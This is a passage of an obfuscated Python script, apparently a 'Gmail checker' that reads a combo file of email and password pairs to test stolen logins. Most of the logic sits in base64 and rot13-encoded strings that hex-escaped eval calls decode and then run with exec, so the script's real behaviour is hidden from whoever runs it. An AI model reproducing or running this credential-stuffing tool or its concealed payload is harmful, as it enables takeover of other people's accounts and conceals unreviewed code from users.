BgKQogICAoKCcpKCcpICAgICAgICAgKQogICAvICBeICAgICAgICApICAgfAogICBcLi0tLiAgICAgICAgICAgfAogICAgXC0tJyAgICAgICAgICAvCiAgICAgXF9fLi0nIF9fLi4nJwogICAgICAgLyAgICAgfAogICIiIikKICAgIHR5cGVzY3IoIkJPRyBHTUFJTCBDSEVDS0VSIikKICBpbml6aWFsZSgpCiAgY29udCA9IDAKICBzdWNjID0gMAogIGRpcmVtYWlsID0gcmF3X2lucHV0KCJDb21ibzogIikKCiAgbCA9IG9wZW4oZGlyZW1haWwsICJyIikKICBlbSA9IGwucmVhZGxpbmVzKCkKICBlb'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))